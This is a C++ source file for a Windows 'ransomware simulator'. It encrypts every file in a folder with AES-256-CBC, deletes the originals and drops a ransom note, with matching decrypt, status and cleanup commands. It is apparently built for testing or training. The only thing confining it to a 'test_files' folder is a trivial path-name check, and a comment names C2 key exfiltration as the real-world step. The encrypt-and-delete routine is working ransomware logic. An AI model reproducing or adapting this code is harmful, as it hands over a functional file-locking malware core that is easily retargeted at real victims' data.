// ransomware_sim.cpp — AES-256-CBC ransomware simulator (SAFETY: ./test_files/ only)
// Compile: g++ -std=c++17 -o ransomware_sim.exe ransomware_sim.cpp -ladvapi32 -lbcrypt
// Usage: ransomware_sim.exe setup | encrypt | decrypt <ransom.key> | status | cleanup

#define _WIN32_WINNT 0x0601
#define NOMINMAX
#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdint.h>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>
#include <algorithm>

#pragma comment(lib, "bcrypt.lib")

namespace fs = std::filesystem;

static const char* SAFE_DIR   = ".\\test_files";
static const char* KEY_FILE   = "ransom.key";
static const char* EXT_ENC    = ".enc";
static const char* RANSOM_NOTE = "!!READ_ME!!.txt";

// ─── Safety check ─────────────────────────────────────────────────────────────

static bool verify_safe_dir() {
    char abs[MAX_PATH]{};
    GetFullPathNameA(SAFE_DIR, MAX_PATH, abs, nullptr);
    std::string s(abs);
    // Must end with \test_files
    if (s.size() < 10) return false;
    std::string tail = s.substr(s.size() - 10);
    for (auto& c : tail) c = (char)tolower(c);
    if (tail != "test_files") {
        fprintf(stderr, "[!] SAFETY ABORT: will only operate on .\\test_files\\\n");
        return false;
    }
    if (!fs::exists(abs)) {
        fprintf(stderr, "[!] %s does not exist. Run 'setup' first.\n", abs);
        return false;
    }
    return true;
}

// ─── BCrypt AES-256-CBC helpers ───────────────────────────────────────────────

static std::vector<uint8_t> bcrypt_aes_cbc(
        const uint8_t* key32, const uint8_t* iv16,
        const uint8_t* input, size_t in_len, bool encrypt) {

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS st;
    std::vector<uint8_t> out;

    st = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(st)) return out;

    st = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                           (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                           sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    DWORD obj_size = 0, dummy = 0;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&obj_size, sizeof(obj_size), &dummy, 0);
    std::vector<uint8_t> key_obj(obj_size);

    st = BCryptGenerateSymmetricKey(hAlg, &hKey, key_obj.data(), obj_size,
                                    (PUCHAR)key32, 32, 0);
    if (!BCRYPT_SUCCESS(st)) { BCryptCloseAlgorithmProvider(hAlg, 0); return out; }

    // IV is consumed/mutated by BCrypt, so copy it
    std::vector<uint8_t> iv_copy(iv16, iv16 + 16);

    DWORD out_len = 0;
    if (encrypt) {
        // Add PKCS7 padding
        size_t padded = ((in_len / 16) + 1) * 16;
        std::vector<uint8_t> padded_in(padded, 0);
        memcpy(padded_in.data(), input, in_len);
        uint8_t pad = (uint8_t)(padded - in_len);
        for (size_t i = in_len; i < padded; ++i) padded_in[i] = pad;

        out.resize(padded);
        st = BCryptEncrypt(hKey, padded_in.data(), (ULONG)padded, nullptr,
                           iv_copy.data(), 16, out.data(), (ULONG)padded, &out_len, 0);
        out.resize(out_len);
    } else {
        out.resize(in_len);
        st = BCryptDecrypt(hKey, (PUCHAR)input, (ULONG)in_len, nullptr,
                           iv_copy.data(), 16, out.data(), (ULONG)in_len, &out_len, 0);
        out.resize(out_len);
        // Strip PKCS7 padding
        if (!out.empty()) {
            uint8_t pad = out.back();
            if (pad <= 16 && pad > 0 && out.size() >= pad)
                out.resize(out.size() - pad);
        }
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return out;
}

// ─── Key generation ───────────────────────────────────────────────────────────

static std::vector<uint8_t> gen_random(size_t n) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RNG_ALGORITHM, nullptr, 0);
    std::vector<uint8_t> buf(n);
    BCryptGenRandom(hAlg, buf.data(), (ULONG)n, 0);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return buf;
}

// ─── setup: create test_files/ with sample files ─────────────────────────────

static void cmd_setup() {
    fs::create_directories(SAFE_DIR);
    const struct { const char* name; const char* content; } FILES[] = {
        {"document.txt",  "This is a sensitive document.\nDo not encrypt production files.\n"},
        {"report.txt",    "Q3 financial summary\nRevenue: $100,000\nExpenses: $80,000\n"},
        {"notes.txt",     "Meeting notes: discuss AES-CBC implementation in BCrypt API.\n"},
        {"config.ini",    "[server]\nhost=localhost\nport=8080\n"},
        {nullptr, nullptr}
    };
    for (int i = 0; FILES[i].name; ++i) {
        std::string path = std::string(SAFE_DIR) + "\\" + FILES[i].name;
        FILE* f = fopen(path.c_str(), "w");
        if (f) { fputs(FILES[i].content, f); fclose(f); }
        printf("[+] Created: %s\n", path.c_str());
    }
    printf("[*] Setup complete. %s is ready.\n", SAFE_DIR);
}

// ─── encrypt ─────────────────────────────────────────────────────────────────

static void cmd_encrypt() {
    if (!verify_safe_dir()) return;

    auto key = gen_random(32);

    // Save key to disk (in real ransomware this would be transmitted to C2)
    {
        FILE* kf = fopen(KEY_FILE, "wb");
        if (!kf) { fprintf(stderr, "Cannot write %s\n", KEY_FILE); return; }
        fwrite(key.data(), 1, 32, kf);
        fclose(kf);
        printf("[+] Key saved: %s\n", KEY_FILE);
    }

    int count = 0;
    for (auto& entry : fs::directory_iterator(SAFE_DIR)) {
        if (!entry.is_regular_file()) continue;
        auto p = entry.path();
        if (p.extension() == EXT_ENC) continue;   // already encrypted
        if (p.filename() == RANSOM_NOTE) continue;

        std::ifstream fin(p, std::ios::binary);
        std::vector<uint8_t> plaintext((std::istreambuf_iterator<char>(fin)), {});
        fin.close();

        auto iv = gen_random(16);
        auto ciphertext = bcrypt_aes_cbc(key.data(), iv.data(),
                                         plaintext.data(), plaintext.size(), true);

        // Output: .enc file = [16-byte IV][ciphertext]
        std::string enc_path = p.string() + EXT_ENC;
        std::ofstream fout(enc_path, std::ios::binary);
        fout.write((const char*)iv.data(), 16);
        fout.write((const char*)ciphertext.data(), ciphertext.size());
        fout.close();

        fs::remove(p);
        printf("[+] Encrypted: %s -> %s\n", p.filename().string().c_str(),
               fs::path(enc_path).filename().string().c_str());
        ++count;
    }

    // Drop ransom note
    std::string note_path = std::string(SAFE_DIR) + "\\" + RANSOM_NOTE;
    FILE* nf = fopen(note_path.c_str(), "w");
    if (nf) {
        fprintf(nf,
            "=== YOUR FILES HAVE BEEN ENCRYPTED ===\n\n"
            "[SIMULATION ONLY — No real harm done]\n\n"
            "To decrypt: ransomware_sim.exe decrypt %s\n"
            "Key file:   %s\n", KEY_FILE, KEY_FILE);
        fclose(nf);
    }
    printf("\n[*] Encrypted %d file(s). Key: %s\n", count, KEY_FILE);
}

// ─── decrypt <key_file> ───────────────────────────────────────────────────────

static void cmd_decrypt(const char* key_path) {
    if (!verify_safe_dir()) return;

    FILE* kf = fopen(key_path, "rb");
    if (!kf) { fprintf(stderr, "Cannot open key: %s\n", key_path); return; }
    uint8_t key[32]{};
    if (fread(key, 1, 32, kf) != 32) { fclose(kf); fprintf(stderr, "Invalid key file\n"); return; }
    fclose(kf);

    int count = 0;
    for (auto& entry : fs::directory_iterator(SAFE_DIR)) {
        if (!entry.is_regular_file()) continue;
        auto p = entry.path();
        if (p.extension() != EXT_ENC) continue;

        std::ifstream fin(p, std::ios::binary);
        std::vector<uint8_t> raw((std::istreambuf_iterator<char>(fin)), {});
        fin.close();

        if (raw.size() < 17) { fprintf(stderr, "[!] Too small: %s\n", p.string().c_str()); continue; }

        uint8_t iv[16];
        memcpy(iv, raw.data(), 16);
        auto plaintext = bcrypt_aes_cbc(key, iv, raw.data()+16, raw.size()-16, false);

        // Original filename: strip .enc
        std::string orig = p.string().substr(0, p.string().size() - strlen(EXT_ENC));
        std::ofstream fout(orig, std::ios::binary);
        fout.write((const char*)plaintext.data(), plaintext.size());
        fout.close();

        fs::remove(p);
        printf("[+] Decrypted: %s -> %s\n",
               p.filename().string().c_str(),
               fs::path(orig).filename().string().c_str());
        ++count;
    }

    // Remove ransom note
    fs::remove(std::string(SAFE_DIR) + "\\" + RANSOM_NOTE);
    printf("\n[*] Decrypted %d file(s)\n", count);
}

// ─── status ───────────────────────────────────────────────────────────────────

static void cmd_status() {
    if (!fs::exists(SAFE_DIR)) { printf("test_files/ does not exist. Run 'setup'\n"); return; }
    int plain = 0, enc = 0;
    for (auto& e : fs::directory_iterator(SAFE_DIR)) {
        if (!e.is_regular_file()) continue;
        if (e.path().extension() == EXT_ENC) ++enc;
        else ++plain;
    }
    printf("test_files/: %d plaintext, %d encrypted\n", plain, enc);
    printf("Key file (%s): %s\n", KEY_FILE, fs::exists(KEY_FILE) ? "EXISTS" : "not found");
}

// ─── cleanup ─────────────────────────────────────────────────────────────────

static void cmd_cleanup() {
    fs::remove_all(SAFE_DIR);
    fs::remove(KEY_FILE);
    printf("[*] Cleaned up test_files/ and %s\n", KEY_FILE);
}

// ─── Main ─────────────────────────────────────────────────────────────────────

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("=== Ransomware Simulator (SAFE MODE — test_files/ only) ===\n"
               "Usage:\n"
               "  ransomware_sim.exe setup\n"
               "  ransomware_sim.exe encrypt\n"
               "  ransomware_sim.exe decrypt <ransom.key>\n"
               "  ransomware_sim.exe status\n"
               "  ransomware_sim.exe cleanup\n");
        return 1;
    }
    std::string cmd(argv[1]);
    if      (cmd == "setup")                        cmd_setup();
    else if (cmd == "encrypt")                      cmd_encrypt();
    else if (cmd == "decrypt" && argc >= 3)          cmd_decrypt(argv[2]);
    else if (cmd == "status")                       cmd_status();
    else if (cmd == "cleanup")                      cmd_cleanup();
    else { fprintf(stderr, "Unknown command.\n"); return 1; }
    return 0;
}
